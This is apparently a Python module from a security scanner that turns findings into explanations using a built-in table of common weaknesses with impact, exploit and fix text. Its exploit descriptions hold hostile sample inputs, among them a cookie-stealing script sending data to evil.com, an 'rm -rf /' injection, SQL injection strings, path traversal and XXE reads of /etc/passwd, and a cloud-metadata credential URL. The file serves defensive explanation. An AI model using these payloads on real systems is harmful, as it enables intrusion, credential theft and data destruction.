#!/usr/bin/env python3
"""Finding explainer -- generates natural language explanations.

Takes any Attestor finding and produces a structured, human-readable
explanation: what it is, why it matters, how it can be exploited,
and how to fix it. No LLM -- template composition with code context.

    from explainer import Explainer
    exp = Explainer()
    explanation = exp.explain(finding)
    print(explanation.full_text)
"""
from __future__ import annotations

import os
import re
from dataclasses import dataclass, field
from pathlib import Path

CWE_DB: dict[str, dict[str, str]] = {
    "CWE-78": {
        "name": "OS Command Injection",
        "impact": "An attacker can execute arbitrary operating system commands on the server, leading to full system compromise, data theft, or lateral movement.",
        "exploit": "An attacker supplies shell metacharacters (;, |, &&, $()) in user input that reaches a system command. For example, entering `; rm -rf /` as a filename could wipe the filesystem.",
        "fix": "Use subprocess with a list of arguments instead of a shell string. Never pass unsanitized input to os.system(), os.popen(), or subprocess with shell=True.",
        "owasp": "A03:2021 Injection",
        "example_fix": "subprocess.run(['ls', '-l', user_path], shell=False)",
    },
    "CWE-79": {
        "name": "Cross-Site Scripting (XSS)",
        "impact": "An attacker can inject JavaScript into pages viewed by other users, stealing session cookies, redirecting to phishing sites, or performing actions as the victim.",
        "exploit": "An attacker submits <script>document.location='https://evil.com/?c='+document.cookie</script> in a form field that gets rendered without escaping.",
        "fix": "Always HTML-encode user output. Use your framework's auto-escaping (Jinja2 with autoescape=True, React's JSX). Never use innerHTML or dangerouslySetInnerHTML with user data.",
        "owasp": "A03:2021 Injection",
        "example_fix": "{{ user_input | e }}  # Jinja2 auto-escape",
    },
    "CWE-89": {
        "name": "SQL Injection",
        "impact": "An attacker can read, modify, or delete any data in the database, bypass authentication, or in some cases execute OS commands through the database server.",
        "exploit": "An attacker enters `' OR '1'='1` in a login field, or `'; DROP TABLE users;--` in a search box, manipulating the SQL query structure.",
        "fix": "Use parameterized queries (placeholders) instead of string concatenation. Never build SQL by inserting user input directly into the query string.",
        "owasp": "A03:2021 Injection",
        "example_fix": "cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))",
    },
    "CWE-22": {
        "name": "Path Traversal",
        "impact": "An attacker can read or write files outside the intended directory, accessing /etc/passwd, configuration files, source code, or overwriting critical files.",
        "exploit": "An attacker sends `../../../../etc/passwd` as a filename parameter, escaping the intended directory to access system files.",
        "fix": "Resolve the full path with os.path.realpath() and verify it starts with the allowed base directory. Reject paths containing '..' components.",
        "owasp": "A01:2021 Broken Access Control",
        "example_fix": "real = os.path.realpath(os.path.join(base, name))\nassert real.startswith(os.path.realpath(base))",
    },
    "CWE-502": {
        "name": "Deserialization of Untrusted Data",
        "impact": "An attacker can execute arbitrary code by crafting malicious serialized objects. Python's pickle, yaml.load, and marshal are all exploitable.",
        "exploit": "An attacker sends a crafted pickle payload that executes os.system('...') when deserialized, achieving remote code execution.",
        "fix": "Never deserialize untrusted data with pickle, marshal, or yaml.load (use yaml.safe_load). Use JSON for data exchange. If pickle is required, use hmac signing to verify the source.",
        "owasp": "A08:2021 Software and Data Integrity Failures",
        "example_fix": "data = yaml.safe_load(user_input)  # NOT yaml.load()",
    },
    "CWE-798": {
        "name": "Hardcoded Credentials",
        "impact": "Anyone with access to the source code or binary can extract credentials. If committed to git, the secret is in the history forever, even after deletion.",
        "exploit": "An attacker finds API_KEY = 'sk-abc123...' in the source, uses it to access the production API, and exfiltrates customer data.",
        "fix": "Move secrets to environment variables, a vault (HashiCorp Vault, AWS Secrets Manager), or a .env file excluded from version control.",
        "owasp": "A07:2021 Identification and Authentication Failures",
        "example_fix": "api_key = os.environ['API_KEY']  # NOT hardcoded",
    },
    "CWE-327": {
        "name": "Use of Broken Cryptographic Algorithm",
        "impact": "Data encrypted with broken algorithms (MD5, SHA1 for security, DES, RC4) can be decrypted or forged, exposing sensitive data or allowing authentication bypass.",
        "exploit": "An attacker generates an MD5 collision to forge a certificate, or brute-forces a DES key to decrypt stored passwords.",
        "fix": "Use SHA-256+ for hashing, AES-256-GCM for encryption, bcrypt/argon2 for passwords. Remove all uses of MD5, SHA1, DES, RC4, and 3DES.",
        "owasp": "A02:2021 Cryptographic Failures",
        "example_fix": "hashlib.sha256(data).hexdigest()  # NOT md5()",
    },
    "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "impact": "An attacker can make the server send requests to internal services, cloud metadata endpoints (169.254.169.254), or other machines on the private network.",
        "exploit": "An attacker submits http://169.254.169.254/latest/meta-data/iam/security-credentials/ as a URL, causing the server to fetch and return AWS credentials.",
        "fix": "Validate and allowlist destination URLs. Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x). Use a dedicated HTTP proxy for outbound requests.",
        "owasp": "A10:2021 Server-Side Request Forgery",
        "example_fix": "if ipaddress.ip_address(host).is_private: raise ValueError('blocked')",
    },
    "CWE-94": {
        "name": "Code Injection",
        "impact": "An attacker can execute arbitrary code in the application's runtime, gaining full control of the process with all its permissions and access.",
        "exploit": "An attacker injects `__import__('os').system('whoami')` into a field that reaches eval(), executing system commands.",
        "fix": "Never use eval() or exec() with user input. Use ast.literal_eval() for safe evaluation of Python literals. For math expressions, use a parser library.",
        "owasp": "A03:2021 Injection",
        "example_fix": "result = ast.literal_eval(user_input)  # NOT eval()",
    },
    "CWE-200": {
        "name": "Information Exposure",
        "impact": "Sensitive information (stack traces, database queries, internal paths, credentials) leaks to users, giving attackers a map of the system's internals.",
        "exploit": "An attacker triggers an error to see a stack trace revealing database table names, file paths, framework versions, and SQL queries.",
        "fix": "Use generic error messages in production. Log detailed errors server-side. Disable debug mode. Strip headers that reveal technology (X-Powered-By, Server).",
        "owasp": "A01:2021 Broken Access Control",
        "example_fix": "app.config['DEBUG'] = False  # in production",
    },
    "CWE-352": {
        "name": "Cross-Site Request Forgery (CSRF)",
        "impact": "An attacker can trick an authenticated user into performing unintended actions (changing password, transferring funds, deleting account) by loading a malicious page.",
        "exploit": "An attacker embeds <img src='https://bank.com/transfer?to=attacker&amount=10000'> in a forum post. Any logged-in user viewing the post triggers the transfer.",
        "fix": "Use anti-CSRF tokens on every state-changing form. Verify the Origin/Referer header. Use SameSite=Strict on session cookies.",
        "owasp": "A01:2021 Broken Access Control",
        "example_fix": "<input type='hidden' name='csrf_token' value='{{ token }}'>",
    },
    "CWE-611": {
        "name": "XML External Entity (XXE) Injection",
        "impact": "An attacker can read local files, perform SSRF, or cause denial of service through billion-laughs attacks by exploiting XML parser configurations.",
        "exploit": "An attacker submits XML with <!ENTITY xxe SYSTEM 'file:///etc/passwd'> to read server files through the XML parser.",
        "fix": "Disable external entity processing. In Python: use defusedxml instead of xml.etree. In Java: set XMLConstants.FEATURE_SECURE_PROCESSING.",
        "owasp": "A05:2021 Security Misconfiguration",
        "example_fix": "import defusedxml.ElementTree as ET  # NOT xml.etree",
    },
    "CWE-434": {
        "name": "Unrestricted File Upload",
        "impact": "An attacker can upload malicious files (web shells, executables) that get executed by the server, leading to remote code execution.",
        "exploit": "An attacker uploads shell.php disguised as image.jpg, then navigates to /uploads/shell.php to execute commands on the server.",
        "fix": "Validate file type by content (magic bytes), not just extension. Store uploads outside the web root. Rename files. Set Content-Disposition: attachment.",
        "owasp": "A04:2021 Insecure Design",
        "example_fix": "allowed = {'.jpg', '.png', '.pdf'}\nassert Path(f.filename).suffix.lower() in allowed",
    },
    "CWE-287": {
        "name": "Improper Authentication",
        "impact": "An attacker can bypass authentication to access protected resources, impersonate other users, or gain administrative privileges.",
        "exploit": "An attacker manipulates a JWT token without verification, bypasses a login check by setting a cookie directly, or exploits a broken session fixation.",
        "fix": "Use established authentication libraries (passport.js, Django auth, Spring Security). Never roll your own auth. Enforce MFA for admin accounts. Use constant-time comparison for tokens.",
        "owasp": "A07:2021 Identification and Authentication Failures",
        "example_fix": "import hmac\nassert hmac.compare_digest(provided_token, expected_token)",
    },
    "CWE-306": {
        "name": "Missing Authentication for Critical Function",
        "impact": "Critical functionality (admin panels, API endpoints, data exports) is accessible without any authentication, allowing any user or attacker to perform privileged actions.",
        "exploit": "An attacker directly accesses /admin/delete-user?id=1 without logging in, because the endpoint has no authentication check.",
        "fix": "Apply authentication middleware to all routes that perform sensitive operations. Use a deny-by-default approach where new endpoints require authentication unless explicitly marked public.",
        "owasp": "A07:2021 Identification and Authentication Failures",
        "example_fix": "@login_required\ndef admin_delete_user(request, user_id): ...",
    },
    "CWE-862": {
        "name": "Missing Authorization",
        "impact": "An authenticated user can access or modify resources belonging to other users, escalate privileges, or perform actions beyond their role.",
        "exploit": "A regular user changes the user_id parameter from their own ID to another user's ID, accessing that user's private data without any authorization check.",
        "fix": "Check authorization on every request, not just authentication. Verify the current user owns or has permission for the specific resource being accessed. Use RBAC or ABAC.",
        "owasp": "A01:2021 Broken Access Control",
        "example_fix": "if record.owner_id != current_user.id:\n    raise PermissionError('not your resource')",
    },
    "CWE-312": {
        "name": "Cleartext Storage of Sensitive Information",
        "impact": "Sensitive data (passwords, tokens, PII) stored in plaintext can be read by anyone with database access, backup access, or through a data breach.",
        "exploit": "An attacker gains read access to the database (via SQL injection or a backup) and finds all user passwords stored in cleartext.",
        "fix": "Hash passwords with bcrypt/argon2. Encrypt sensitive fields at rest with AES-256. Use your cloud provider's KMS for key management. Never store raw credit card numbers.",
        "owasp": "A02:2021 Cryptographic Failures",
        "example_fix": "import bcrypt\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())",
    },
    "CWE-326": {
        "name": "Inadequate Encryption Strength",
        "impact": "Data encrypted with weak keys (RSA-1024, AES-128 in some contexts, short passwords) can be brute-forced, exposing all encrypted data.",
        "exploit": "An attacker captures encrypted traffic and brute-forces a 1024-bit RSA key using cloud computing resources, decrypting all historical communications.",
        "fix": "Use RSA-2048+ or RSA-4096 for asymmetric, AES-256 for symmetric encryption. Ensure key derivation uses sufficient iterations (PBKDF2 600k+, bcrypt cost 12+).",
        "owasp": "A02:2021 Cryptographic Failures",
        "example_fix": "from cryptography.fernet import Fernet\nkey = Fernet.generate_key()  # 256-bit",
    },
    "CWE-400": {
        "name": "Uncontrolled Resource Consumption",
        "impact": "An attacker can exhaust server resources (memory, CPU, disk, connections) causing denial of service for legitimate users.",
        "exploit": "An attacker sends a 10GB file upload, a regex that causes catastrophic backtracking, or opens thousands of connections without closing them.",
        "fix": "Set limits on request body size, file upload size, query complexity, and connection count. Use timeouts on all I/O operations. Implement rate limiting.",
        "owasp": "A04:2021 Insecure Design",
        "example_fix": "app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB",
    },
    "CWE-476": {
        "name": "NULL Pointer Dereference",
        "impact": "Dereferencing a null pointer crashes the program, causing denial of service. In some languages and contexts, it can lead to memory corruption.",
        "exploit": "An attacker sends input that causes a function to return NULL, and the caller dereferences it without checking, crashing the server.",
        "fix": "Always check return values for NULL before dereferencing. Use optional types or Result types where available. Enable compiler warnings for null dereference.",
        "owasp": "A04:2021 Insecure Design",
        "example_fix": "if (ptr == NULL) { return -1; }  // check before use",
    },
    "CWE-120": {
        "name": "Buffer Overflow",
        "impact": "An attacker can overwrite adjacent memory, potentially executing arbitrary code, crashing the program, or corrupting data.",
        "exploit": "An attacker sends a string longer than the buffer size to a strcpy() call, overwriting the return address on the stack to redirect execution.",
        "fix": "Use bounds-checked functions (strncpy, snprintf). Use safe string libraries. Enable stack canaries and ASLR. In modern code, prefer std::string or Vec<u8>.",
        "owasp": "A04:2021 Insecure Design",
        "example_fix": "strncpy(dst, src, sizeof(dst) - 1);\ndst[sizeof(dst) - 1] = '\\0';",
    },
    "CWE-190": {
        "name": "Integer Overflow",
        "impact": "Arithmetic overflow can cause incorrect calculations, buffer size miscalculations leading to heap overflow, or bypass of security checks.",
        "exploit": "An attacker provides a large quantity value that overflows when multiplied by price, resulting in a negative total or a tiny buffer allocation.",
        "fix": "Use checked arithmetic operations. Validate integer inputs against expected ranges before arithmetic. Use arbitrary-precision integers for financial calculations.",
        "owasp": "A04:2021 Insecure Design",
        "example_fix": "if (a > INT_MAX / b) { /* overflow */ }",
    },
    "CWE-732": {
        "name": "Incorrect Permission Assignment",
        "impact": "Files, directories, or resources with overly permissive access allow unauthorized users to read sensitive data, modify configuration, or execute malicious code.",
        "exploit": "A config file with 777 permissions allows any user on the system to read database credentials and modify the application's behavior.",
        "fix": "Apply principle of least privilege. Set files to 644 (owner read/write, others read) or 600 (owner only). Set directories to 755 or 700. Never use 777.",
        "owasp": "A01:2021 Broken Access Control",
        "example_fix": "os.chmod(config_path, 0o600)",
    },
    "CWE-942": {
        "name": "Overly Permissive CORS Policy",
        "impact": "A wildcard or overly broad CORS policy allows any website to make authenticated requests to your API, enabling data theft from logged-in users.",
        "exploit": "An attacker hosts a page that makes fetch() requests to your API with the user's cookies, reading private data because CORS allows any origin.",
        "fix": "Allowlist specific trusted origins. Never use Access-Control-Allow-Origin: * with credentials. Validate the Origin header server-side.",
        "owasp": "A05:2021 Security Misconfiguration",
        "example_fix": "allowed = {'https://app.example.com'}\nif origin in allowed:\n    resp.headers['Access-Control-Allow-Origin'] = origin",
    },
}

SEVERITY_IMPACT = {
    "CRITICAL": "This finding requires immediate attention. It represents a directly exploitable vulnerability that could lead to full system compromise.",
    "HIGH": "This is a serious security issue. An attacker with moderate skill could exploit this to gain unauthorized access or cause significant damage.",
    "MEDIUM": "This finding represents a real risk, though exploitation typically requires specific conditions or additional vulnerabilities to chain with.",
    "LOW": "This is a code quality or defense-in-depth concern. While not immediately dangerous, fixing it reduces the overall attack surface.",
}

CATEGORY_CONTEXT = {
    "core": "static analysis rule match",
    "secrets": "hardcoded secret or credential",
    "exploits": "exploit, backdoor, or malicious code pattern",
    "taint": "tainted data flow from user input to dangerous sink",
    "iac": "infrastructure-as-code misconfiguration",
    "supply": "supply chain or dependency risk",
    "cicd": "CI/CD pipeline security issue",
    "similarity": "code structurally similar to a known CVE",
    "structural-outlier": "statistically anomalous code structure",
    "suspicious-import-combo": "unusual combination of imported modules",
    "high-entropy-string": "possible encoded or encrypted data",
    "obfuscation-pattern": "code obfuscation technique",
    "anti-pattern-cluster": "cluster of dangerous operations",
}


@dataclass
class Explanation:
    finding: dict
    summary: str
    what: str
    why: str
    how_exploited: str
    how_to_fix: str
    severity_rationale: str
    owasp_category: str
    code_context: str
    fix_example: str
    references: list[str]

    @property
    def full_text(self) -> str:
        sections = [
            f"## {self.summary}\n",
            f"**Severity:** {self.finding.get('severity', '?')} -- {self.severity_rationale}\n",
            f"**Location:** {self.finding.get('path', '?')}:{self.finding.get('line', '?')}\n",
        ]
        if self.owasp_category:
            sections.append(f"**OWASP:** {self.owasp_category}\n")
        sections.append(f"\n### What is this?\n{self.what}\n")
        sections.append(f"\n### Why does it matter?\n{self.why}\n")
        if self.how_exploited:
            sections.append(f"\n### How can it be exploited?\n{self.how_exploited}\n")
        if self.code_context:
            sections.append(f"\n### In your code\n```\n{self.code_context}\n```\n")
        sections.append(f"\n### How to fix\n{self.how_to_fix}\n")
        if self.fix_example:
            sections.append(f"\n### Fix example\n```python\n{self.fix_example}\n```\n")
        if self.references:
            sections.append("\n### References\n")
            for ref in self.references:
                sections.append(f"- {ref}\n")
        return "".join(sections)


class Explainer:
    def __init__(self, context_lines: int = 5):
        self._context_lines = context_lines

    def _read_context(self, path: str, line: int) -> str:
        if not path or not os.path.isfile(path):
            return ""
        try:
            with open(path, encoding="utf-8", errors="replace") as f:
                lines = f.readlines()
        except (OSError, UnicodeDecodeError):
            return ""

        start = max(0, line - self._context_lines - 1)
        end = min(len(lines), line + self._context_lines)
        context_lines = []
        for i in range(start, end):
            marker = " >> " if i == line - 1 else "    "
            context_lines.append(f"{i + 1:4d}{marker}{lines[i].rstrip()}")
        return "\n".join(context_lines)

    def _extract_cwe(self, finding: dict) -> str | None:
        cwe = finding.get("cwe", "")
        if not cwe:
            rule = finding.get("rule_id", "")
            m = re.search(r'CWE-(\d+)', rule, re.IGNORECASE)
            if m:
                cwe = f"CWE-{m.group(1)}"
        if cwe and not cwe.startswith("CWE-"):
            cwe = f"CWE-{cwe}"
        return cwe if cwe else None

    def explain(self, finding: dict) -> Explanation:
        cwe = self._extract_cwe(finding)
        cwe_info = CWE_DB.get(cwe, {}) if cwe else {}
        severity = finding.get("severity", "MEDIUM")
        rule_id = finding.get("rule_id", "")
        desc = finding.get("description", "")
        path = finding.get("path", "")
        line = finding.get("line", 0)
        category = finding.get("category", "")

        cwe_name = cwe_info.get("name", "")
        summary = cwe_name if cwe_name else desc[:80]
        if rule_id and not cwe_name:
            summary = f"{rule_id}: {desc[:60]}"

        what = ""
        if cwe_name:
            what = f"This is a **{cwe_name}** ({cwe}) vulnerability. {desc}"
        elif desc:
            what = desc
        else:
            what = f"A {severity.lower()}-severity finding was detected by rule {rule_id}."

        cat_context = CATEGORY_CONTEXT.get(category, "")
        if cat_context:
            what += f" This was identified through {cat_context}."

        why = cwe_info.get("impact", SEVERITY_IMPACT.get(severity, ""))
        how_exploited = cwe_info.get("exploit", "")
        how_to_fix = cwe_info.get("fix", "")

        if not how_to_fix and desc:
            how_to_fix = f"Review and remediate the code at {path}:{line}. "
            if severity in ("CRITICAL", "HIGH"):
                how_to_fix += "This should be prioritized for immediate fix."
            else:
                how_to_fix += "Consider addressing this in the next sprint."

        severity_rationale = SEVERITY_IMPACT.get(severity, "")
        owasp = cwe_info.get("owasp", "")
        code_context = self._read_context(path, line) if line > 0 else ""
        fix_example = cwe_info.get("example_fix", "")

        references = []
        if cwe:
            references.append(f"https://cwe.mitre.org/data/definitions/{cwe.split('-')[1]}.html")
        if owasp:
            references.append(f"OWASP Top 10: {owasp}")

        return Explanation(
            finding=finding,
            summary=summary,
            what=what,
            why=why,
            how_exploited=how_exploited,
            how_to_fix=how_to_fix,
            severity_rationale=severity_rationale,
            owasp_category=owasp,
            code_context=code_context,
            fix_example=fix_example,
            references=references,
        )

    def explain_batch(self, findings: list[dict]) -> list[Explanation]:
        return [self.explain(f) for f in findings]


def render(explanations: list[Explanation]) -> str:
    if not explanations:
        return "\n  No findings to explain.\n"
    parts = []
    for i, exp in enumerate(explanations, 1):
        parts.append(f"\n{'='*60}")
        parts.append(f"Finding {i}/{len(explanations)}")
        parts.append(f"{'='*60}")
        parts.append(exp.full_text)
    return "\n".join(parts)


def to_dict(explanations: list[Explanation]) -> list[dict]:
    return [
        {
            "summary": e.summary,
            "severity": e.finding.get("severity", ""),
            "path": e.finding.get("path", ""),
            "line": e.finding.get("line", 0),
            "what": e.what,
            "why": e.why,
            "how_exploited": e.how_exploited,
            "how_to_fix": e.how_to_fix,
            "owasp": e.owasp_category,
            "fix_example": e.fix_example,
            "references": e.references,
        }
        for e in explanations
    ]
